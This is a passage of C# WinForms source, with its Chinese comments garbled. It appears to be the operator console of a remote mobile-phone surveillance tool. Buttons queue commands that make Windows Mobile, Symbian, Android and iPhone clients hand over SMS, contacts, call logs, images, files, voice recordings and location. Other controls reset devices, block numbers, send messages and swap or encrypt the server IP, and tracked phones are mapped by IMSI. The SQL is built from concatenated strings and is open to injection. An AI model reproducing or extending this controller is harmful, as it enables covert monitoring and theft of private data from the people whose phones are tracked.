                            temp2 = temp1 / 1024;
                            float temp = float.Parse(temp2.ToString("#0.00"));
                           // t = temp2.ToString() + "MB";
                            t = temp.ToString() + "MB";

                        }
                        else if (temp1 < 1)
                        {
                            t = "1KB";
                        }
                        else
                        {
                            float temp = float.Parse(temp1.ToString("#0.00"));
                            t = temp.ToString() + "KB";
                        }

                        lvi.SubItems.Add(t);
                        lvi.SubItems.Add("�ļ�");
                        lvi.SubItems.Add(f.LastAccessTime.ToString());
                        lvi.SubItems.Add(f.FullName);
                    }
                }
            }
            catch
            {
            }
        }

        private void treeView9_AfterCheck(object sender, TreeViewEventArgs e)
        {
            //�������δ��������ѡ��һ����

            bool isChecked = true;//����һ��BOOLֵ

            TreeNode parentNode = e.Node.Parent;//�õ���ǰѡ�еĽڵ�ĸ��ڵ�
            if (parentNode == null)//���û�и��ڵ� �򷵻�
                return;
            TreeNode tn = parentNode.FirstNode;//�õ����ڵ�ĵ�һ���ڵ�
            while (tn != null)//�����Ϊ��
            {
                if (tn.Checked == false)//����˽ڵ�û��ѡ��
                {
                    isChecked = false;//BOOLΪFALSE
                    break;//����
                }
                tn = tn.NextNode;//������һ���ڵ�
            }
            parentNode.Checked = isChecked;//����BOOLֵ�жϸ��ڵ��Ƿ�ѡ��
        }

        private void listView4_DoubleClick(object sender, EventArgs e)   //�ĵ������б��ļ�˫����
        {
           
            string filename = listView4.SelectedItems[0].SubItems[4].Text;
            System.Diagnostics.Process.Start(filename);
        }

        #endregion

        #region ����ļ��б仯�ĺ���
        public void FileWatcher()
          { 
          FileSystemWatcher FileWatcher = new FileSystemWatcher ();
          string WatcherPath= AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile";
          FileWatcher.Filter = "*.*"; //�趨�������ļ�����
          FileWatcher.Path = WatcherPath; //�趨������Ŀ¼         
              FileWatcher.Changed += new FileSystemEventHandler(FileWatcher_Changed); //Changed �¼�����
            FileWatcher.Renamed += new RenamedEventHandler(FileWatcher_Renamed);//Renamed�¼�����
            FileWatcher.Created += new FileSystemEventHandler(FileWatcher_Created);//Created�¼�����
            FileWatcher.Deleted += new FileSystemEventHandler(FileWatcher_Deleted);//Deleted�¼�����


 
          FileWatcher.IncludeSubdirectories = true;//���ü�����Ŀ¼
          FileWatcher.EnableRaisingEvents = true;//��ʼ���м�������ʵ�˴��Ǳ�ʾ�Ƿ�����¼��������׳���

          }
          void FileWatcher_Changed(object sender, FileSystemEventArgs e)
          {
             jiazai();
          }
        void FileWatcher_Deleted(object sender, FileSystemEventArgs e)
        {
            jiazai();
        }

        void FileWatcher_Created(object sender, FileSystemEventArgs e)
        {
            jiazai();
        }

        void FileWatcher_Renamed(object sender, RenamedEventArgs e)
        {
            jiazai();
        }

        #endregion

        #region   �Ҽ�ɾ�����߼���deleteɾ��
        private void contextMenuStrip1_Click(object sender, EventArgs e)
        {
            contextMenuStrip1.Hide();
            DeleteFile();
        }

        private void listView4_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                DeleteFile();
            }
        }
        public void DeleteFile()
        {

            if (listView4.SelectedItems.Count != 0)
            {
                if (MessageBox.Show("ȷ��ɾ����", "��ɾ�����ɻָ�", MessageBoxButtons.YesNo) == DialogResult.Yes)
                {
                    int count = listView4.SelectedItems.Count;
                    for (int i = 0; i < count; i++)
                    {
                        string path = listView4.SelectedItems[0].SubItems[4].Text;

                        if (listView4.SelectedItems[0].SubItems[2].Text.CompareTo("�ļ���") == 0) //ɾ�������ļ���
                        {
                            FileControl.DeleteFiles(path, true);
                            listView4.SelectedItems[0].Remove();
                        }
                        else
                        {

                            File.Delete(path);
                            listView4.SelectedItems[0].Remove();

                        }
                    }
                    
                }
            }
        }
        #endregion

        #region һ���̳�TreeNode����
        public class MyNode : TreeNode
        {
            public string mytext = null;
            public bool isLoadFiles = false;
            public MyNode(string text, bool isRoot)
            {
                mytext = text;
                if (isRoot)//����ִ���ǲ��ұ�����������ʱ��ִ��
                {
                    //base.Text = text.Substring(0, text.LastIndexOf("\\") - 1);
                    base.Text = text; //text.Substring(0, text.LastIndexOf("\\") );
                }
                else//����ִ���ǲ��ұ����ļ����Լ��ļ���ʱ��ִ��
                {
                    base.Text = text.Substring(text.LastIndexOf("\\") + 1);
                }
            }
            public string MyPath
            {
                get
                {
                    return mytext;
                }
            }
        }

        #endregion
        private void treeView2_AfterSelect_1(object sender, TreeViewEventArgs e)
        {
            SelectBefore = treeView2.SelectedNode.Text;
        }

        private void tabControl1_Selected(object sender, TabControlEventArgs e)
        {
            if (tabControl1.SelectedTab == tabPage13)
                jiazai();
        }

        private void Phone_FormClosing(object sender, FormClosingEventArgs e)
        {
              if (iface != null)
              {
                  iface.BeClose();
              
              }
              else
              {
               
              }
        }


        //�鿴�Ƿ��п͑����Ͼ�
        private bool clientOnlineOrNot()
        {
            if (treeView2.SelectedNode != null) {
                if (treeView2.SelectedNode.ImageIndex == 17) {
                    MessageBox.Show("�ͻ���δ���ߣ��ݲ��ɼ���");
                    return false;
                }
            } else {
                MessageBox.Show("��ѡ������Ŀͻ���");
                return false;
            }
            return true;

        }
        //�����΂���̖���΄��M�н���
        private void HandleEvent(int messageNum)
        {
             SelectBefore = treeView2.SelectedNode.Text;
             string[] info = treeView2.SelectedNode.Text.Split(' ');
               
            string PhoneNum = info[0];
            string PhoneID = info[1];
            string OS = info[2];              

            string Content = null;
            string ComTime = System.DateTime.Now.ToString();
            string Flag = "Doing";
                //Mobileϵͳ֧�ֵ�����
            if(OS.CompareTo("Mobile")==0)
            {
                if (messageNum == 1)
                    Content = "FileInfor";
                else if (messageNum == 2)
                    Content = "Message";
                else if (messageNum == 3)
                    Content = "SimPhoneNum";
                else if (messageNum == 4)
                    Content = "OutLookPhoneNum";
                else if (messageNum == 5)
                    Content = "Appointment";                 
                else if (messageNum == 6)
                    Content = "Task";
                else if (messageNum == 9)
                    Content = "CallRecord";
                else if (messageNum == 11)
                    Content = "Image";
                else if (messageNum == 8)
                {
                    Content = "Stop";
                   /* if (iface != null)
                        iface.BeClose();*/
                } else if (messageNum == 7) {
                    if (!Only()) {
                        Content = "Voice";
                        //MessageBox.Show(Content);
                        //iface = new Interface();                           //Windows Mobile����������  
                        //iface.Ini(FileNow);
                        //Ini(FileNow);             //0704
                    } else {
                        MessageBox.Show("ֻ�ɼ���һ���ն�");
                    }
                }
                else if (messageNum == 10)
                {
                    ADDuser set = new ADDuser(PhoneNum, PhoneID, ComTime, Flag);
                    set.Show();                  

                } else if(messageNum == 13) {
                    Content = "reset";
                }
                else if (messageNum == 14) {
                    Content = "location";
                }
                else
                    MessageBox.Show("���ֻ�ϵͳ�ݲ�֧�ָ�����");
               
           }

                //Symbianϵͳ֧�ֵ�����
              if (OS.CompareTo("Symbian") == 0)
              {
                 
                  if (messageNum == 2)
                      Content = "Message";
                  else if (messageNum == 3)
                      Content = "SimPhoneNum";
                  else if (messageNum == 4)
                      Content = "OutLookPhoneNum";                 
                  else if (messageNum == 9)
                      Content = "CallRecord";
                  else if (messageNum == 11)
                      Content = "Image";
                  else if (messageNum == 8)
                  {
                      Content = "Stop";                   
                  }
                  else if (messageNum == 7)
                  {
                      if (!Only())
                      {
                          Content = "Voice";

                      }
                      else
                          MessageBox.Show("ֻ�ɼ���һ���ն�");
                  } else if(messageNum == 13) {
                    Content = "reset";
                  }
                  else if (messageNum == 14) {
                      Content = "location";
                  }
                  else
                      MessageBox.Show("���ֻ�ϵͳ�ݲ�֧�ָ�����");
               
              }

              if (OS.CompareTo("Android") == 0)
              {
                  if (messageNum == 1)
                      Content = "FileInfor";
                  else if (messageNum == 2)
                      Content = "Message";
                  else if (messageNum == 3)
                      Content = "SimPhoneNum";
                  else if (messageNum == 4)
                      Content = "OutLookPhoneNum";
                  else if (messageNum == 5)
                      Content = "Appointment";              
                  else if (messageNum == 9)
                      Content = "CallRecord";
                  //20111220 android���๦���ݲ���ʹ��
                  /*else if (messageNum == 11)
                      Content = "Image";
                  */else if (messageNum == 8)
                  {
                      Content = "Stop";                     
                  }
                  else if (messageNum == 7)
                  {
                      if (!Only())
                      {
                          Content = "Voice";
                      }
                      else
                          MessageBox.Show("ֻ�ɼ���һ���ն�");
                  }
                  else if (messageNum == 10)
                  {
                      ADDuser set = new ADDuser(PhoneNum, PhoneID, ComTime, Flag);
                      set.Show();


                  } else if (messageNum == 12) {
                      Content = "ColorMsg";
                  }
                  else if (messageNum == 13) {
                      Content = "reset";
                  }
                  else if (messageNum == 14) {
                      Content = "location";
                  }
                  else
                      MessageBox.Show("���ֻ�ϵͳ�ݲ�֧�ָ�����");

              }
              else if (OS.CompareTo("IPhone") == 0) {
                  if (messageNum == 1)
                      Content = "FileInfor";
                  else if (messageNum == 2)
                      Content = "Message";
                  else if (messageNum == 3)
                      Content = "SimPhoneNum";
                  else if (messageNum == 4)
                      Content = "OutLookPhoneNum";
                  else if (messageNum == 5)
                      Content = "Appointment";
                  else if (messageNum == 9)
                      Content = "CallRecord";
                  else if (messageNum == 11)
                      Content = "Image";
                  else if (messageNum == 8) {
                      Content = "Stop";
                  }
                  else if (messageNum == 7) {
                      if (!Only()) {
                          Content = "Voice";

                      }
                      else
                          MessageBox.Show("ֻ�ɼ���һ���ն�");
                  }
                  else if (messageNum == 13) {
                      Content = "reset";
                  }
                  else if (messageNum == 14) {
                      Content = "location";
                  }
                  else if (messageNum == 10) {
                      ADDuser set = new ADDuser(PhoneNum, PhoneID, ComTime, Flag);
                      set.Show();


                  } else
                      MessageBox.Show("���ֻ�ϵͳ�ݲ�֧�ָ�����");
              }
              
                if (Content != null)
                {
                    string sql = "insert into Command(PhoneIMSI,PhoneID,Content,ComTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + Content + "','" + ComTime + "','" + Flag + "')";
                    string sql1 = "insert into ALLCommand(PhoneIMSI,PhoneID,Content,ComTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + Content + "','" + ComTime + "','" + Flag + "')";
                    
                    IntoDatabase1(PhoneNum, PhoneID, Content, ComTime, Flag, sql);//�������񵽡�ִ���С��б���
                    IntoDatabase1(PhoneNum, PhoneID, Content, ComTime, Flag, sql1);//�������񵽡�ȫ�������б���                  
                    updata1();                  
                }


        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(1);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(2);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(3);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(4);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(5);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(6);
        }

        private void button7_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(7);
        }

        private void button8_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(8);
        }

        private void button9_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(9);
        }

        private void button10_Click(object sender, EventArgs e)
        {
            //if (!clientOnlineOrNot()) return;
            //HandleEvent(10);
            //UserInfo userInfo = new UserInfo(PhoneNum, PhoneID, OS);
            //userInfo.ShowDialog();
            ServerIP serverIP = new ServerIP();
            serverIP.ShowDialog();
        }

        private void button11_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(11);
        }

        private void button12_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(12);
        }
        private void button13_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(13);
        }

        private void treeView2_DoubleClick(object sender, EventArgs e)
        {
            if (treeView2.SelectedNode != null) {
                
                String text = treeView2.SelectedNode.Text;
                //MessageBox.Show(text);

                string[] info = text.Split(' ');
               
                string PhoneNum = info[0];
                string PhoneID = info[1];
                string OS = info[2];   

                UserInfo userInfo = new UserInfo(PhoneNum, PhoneID, OS);
                userInfo.ShowDialog();
            } else {
                MessageBox.Show("����ѡ��һ���ֻ���Ϣ��");
            }
        }

        private void button14_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(14);
        }

        private void LocTreeTimer_Tick(object sender, EventArgs e)
        {
            if (locTree)
            {
                loadingPlace(displayLoc);
                locTree = false;
            }
        }

        private void locTreeView_DBClick(object sender, MouseEventArgs e)
        {
            //���ѡ��ĵط����ϴ�һ��
            if (locTreeView.SelectedNode != null) {
                if (cord.CompareTo(locTreeView.SelectedNode.Text) == 0) {
                    //loadingPlace(22);

                    return;
                }
                
                cord = locTreeView.SelectedNode.Text;
                //MessageBox.Show(cord);
            }
            
            //MessageBox.Show(cord);
            loadingPlace(displayLoc);
        }

        //���������Ϣ���ɾ�γ������
        public String generateCord(String PhoneNum, String PhoneID, String OS, String Time, String Longitude, String Latitude)
        {
            String json = "{title:\"��ע\",content:\"" + PhoneNum + "--" + PhoneID + "--" +
                    OS + "--" + Time + "\",point:\"" + Longitude + "|" + Latitude +
                    "\",isOpen:0,icon:{w:50,h:50,l:0,t:0,x:6,lb:5}}";
            return json;
        }
        //�õ�λ����Ϣ������ʾ���µ�λ����Ŀcount��
        public void loadingPlace(int count)
        {
             
            locTreeView.Nodes.Clear();
            string PhoneNum, PhoneID, Time, OS, Latitude = "39.918117", Longitude = "116.402221";

            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();

            string sql = "select * from Location order by ID DESC";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();

            //json format: {title:"��ע",content:"�ֻ�EI/SI/OS/Time",point:"116.403748|39.91571",isOpen:0,icon:{w:50,h:50,l:0,t:0,x:6,lb:5}}
            int cnt = 0;
            System.Collections.ArrayList vec = new ArrayList();

            bool inuse = false;
            //if (cord == "") inuse = true;

            while (datareader.Read() && cnt < count) {
                ++cnt;
                PhoneNum = datareader["PhoneNum"].ToString();         //IMSI��
                PhoneID = datareader["PhoneID"].ToString();
                Time = datareader["ArriveTime"].ToString();
                OS = datareader["OS"].ToString();
                Latitude = datareader["Latitude"].ToString();
                Longitude = datareader["Longitude"].ToString();

                //String json = "title:\"��ע\",content:\"" + PhoneNum + "--" + PhoneID + "--" + OS + "--" + Time + "\";,point:\"" + Longitude + "|" + Latitude + "\",isOpen:0,icon:{w:50,h:50,l:0,t:0,x:6,lb:5}}";
                
                String json = generateCord(PhoneNum, PhoneID, OS, Time, Longitude, Latitude);
                vec.Add(json);

                PhoneNum = PhoneNum + "@" + PhoneID + "@" + OS + "@" + Time + "@" + Longitude + "@" + Latitude;
                locTreeView.Nodes.Add(PhoneNum);
                if (PhoneNum.CompareTo(cord) == 0) {
                    inuse = true;
                }
            }
            conn.Close();

            //��ǰ���ĵ�json�������ڣ�������һ��
            if (inuse == false) {
                if (cord.CompareTo("") != 0) {
                    //MessageBox.Show(cord);
                    String[] array = cord.Split('@');
                    String json = generateCord(array[0], array[1], array[2], array[3], array[4], array[5]);
                    Longitude = array[4];
                    Latitude = array[5];
                    vec.Add(json);
                }
            } else {
                String[] array = cord.Split('@');
                Longitude = array[4];
                Latitude = array[5];
            }
            
            //��vec�����λ��д���ͼ

            if (cord.CompareTo("") == 0) {
                //Ĭ�Ͼ�γ��
                Latitude = "39.918117";
                Longitude = "116.402221";
            }
            //MessageBox.Show(Longitude + "  " + Latitude);
            //var point = new BMap.Point(116.402221,39.918117);//����һ�����ĵ�����
            if (vec.Count != 0) {
                changeMapSource(vec, Longitude, Latitude);
            }
           
            loadingPage();
        }

        public void changeMapSource(ArrayList array, String Longitude, String Latitude)
        {
            //if(array)
            //�޸�IP
            string strTxt = "";
            string sourceFile = System.AppDomain.CurrentDomain.BaseDirectory + "BaiduMap/BDMap.dat";
            StreamReader fileStream = null;
            int line = 0;
            try {
                fileStream = new StreamReader(sourceFile, System.Text.Encoding.Default);
                while (!fileStream.EndOfStream) {
                    ++line;
                    String temp = fileStream.ReadLine();
                    if (line == 34) {
                        //var point = new BMap.Point(116.402221,39.918117);//����һ�����ĵ�����
                        strTxt += "var point = new BMap.Point(" + Longitude + "," + Latitude + ");//����һ�����ĵ�����";
                    }
                    else if (line == 62) {
                        //{title:"��ע",content:"�ֻ�EI/SI/OS",point:"116.403748|39.91571",isOpen:0,icon:{w:50,h:50,l:0,t:0,x:6,lb:5}}
                        System.Array values = array.ToArray(typeof(object));
                        for (int i = 0; i < values.Length; ++i) {
                            temp = (String)values.GetValue(i);
                            if (i < values.Length - 1) {
                                temp += ",";
                            }
                            strTxt += temp;
                            strTxt += Environment.NewLine;
                        }
                    }
                    else {
                        strTxt += temp;
                    }
                    strTxt += Environment.NewLine;
                }

                fileStream.Close();
                fileStream.Dispose();
            }
            catch {
                fileStream.Close();
                fileStream.Dispose();
                MessageBox.Show("��Դ�ļ�ʧ��@��");
                return;
            }

            FileStream stream = null;
            sourceFile = System.AppDomain.CurrentDomain.BaseDirectory + "BaiduMap/BDMap.htm";
            try {
                stream = new FileStream(sourceFile, FileMode.Create);
                byte[] content = System.Text.Encoding.Default.GetBytes(strTxt);
                stream.Write(content, 0, content.Length);
                //stream.SetLength(0);
                stream.Flush();
                stream.Close();
            }
            catch {

                stream.Close();
                MessageBox.Show("��д��ͼ�ļ�ʧ�ܣ�");
                return;
            }
        }

        private void OrderDeleteMenu(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right) {
                if (e.RowIndex >= 0) {
                    //��������ѡ��״̬�Ͳ��ٽ�������
                    if (dataGridView2.Rows[e.RowIndex].Selected == false) {
                        dataGridView2.ClearSelection();
                        dataGridView2.Rows[e.RowIndex].Selected = true;
                    }
                    //ֻѡ��һ��ʱ���û��Ԫ��
                    //if (dataGridView2.SelectedRows.Count == 1) {
                    //    dataGridView2.CurrentCell = dataGridView2.Rows[e.RowIndex].Cells[e.ColumnIndex];
                    //}
                    //���������˵�
                    orderDeleteContextMenu.Show(MousePosition.X, MousePosition.Y);
                }
            }
        }

        private void DeleteSelectedOrder(object sender, ToolStripItemClickedEventArgs e)
        {
            if (e.ClickedItem.Text.Equals("ɾ��")) {
                DataGridViewSelectedRowCollection selected = dataGridView2.SelectedRows;
                String IMSI, IMEI, Content, ComTime;
                //�������ݿ�
                OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
                connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
                connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
                OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
                conn.Open();
                string sql_1 = "delete from Command where ";
                string sql_2 = "delete from AllCommand where ";
                OleDbCommand myCmd_1;

                //ɾ�����ݿ�
                foreach(DataGridViewRow row in selected) {
                    IMSI = row.Cells[0].Value.ToString();
                    IMEI = row.Cells[1].Value.ToString();
                    Content = row.Cells[2].Value.ToString();
                    ComTime = row.Cells[3].Value.ToString();
                    //MessageBox.Show(IMSI + IMEI + Content + ComTime);

                    IMEI = IMEI.Trim();
                    if (IMEI.CompareTo("") == 0) continue;

                    String suffix = "PhoneID = '" + IMEI + "' and PhoneIMSI = '" + IMSI + "' and Content = '" + Content + "' and ComTime = '" + ComTime + "'";
                    String tb_1 = sql_1 + suffix;
                    String tb_2 = sql_2 + suffix;
                    //MessageBox.Show(tb_1);

                    myCmd_1 = new OleDbCommand(tb_1, conn);
                    myCmd_1.ExecuteNonQuery();
                    myCmd_1 = new OleDbCommand(tb_2, conn);
                    myCmd_1.ExecuteNonQuery();

                }
                conn.Close();
                updata1();
                updata2();   
            }

        }

        private void label16_Click(object sender, EventArgs e)
        {

        }

        private void label19_Click(object sender, EventArgs e)
        {

        }

        private void toolStripStatusLabel3_Click(object sender, EventArgs e)
        {

        }

        private void label14_Click(object sender, EventArgs e)
        {

        }

        private void label24_Click(object sender, EventArgs e)
        {

        }

        private void EncryptIP_Click(object sender, EventArgs e)
        {
            //��������IP�Ի���
            EncryptIP aEncryptIP = new EncryptIP();
            aEncryptIP.ShowDialog();
        }

        private void ChangeIP_Click(object sender, EventArgs e)
        {
            //ʹ��ʱ��ע��
            RegistDll aRegistDll = new RegistDll();
            aRegistDll.DoUpdate();

            //��������IP��ַ
            LatestServerIP aLatestServerIP = new LatestServerIP();
            aLatestServerIP.ShowDialog();
        }

        private void SendSpecifiedMsg_Click(object sender, EventArgs e)
        {
            //����ָ�����ŵ��ֻ�
            SendSpecifiedMessage aSendSpecifiedMessage = new SendSpecifiedMessage();
            aSendSpecifiedMessage.ShowDialog();
        }

        private void button6_Click_1(object sender, EventArgs e)
        {
            //��ֹ��������ĳһ������
            ProhibitContactANum aProhibitContactANum = new ProhibitContactANum();
            aProhibitContactANum.ShowDialog();
        }

        private void button11_Click_1(object sender, EventArgs e)
        {
            //�����ֹ��������ĳһ������
            AllowContactANum aAllowContactANum = new AllowContactANum();
            aAllowContactANum.ShowDialog();
        }

      }
}

        
       

       
      
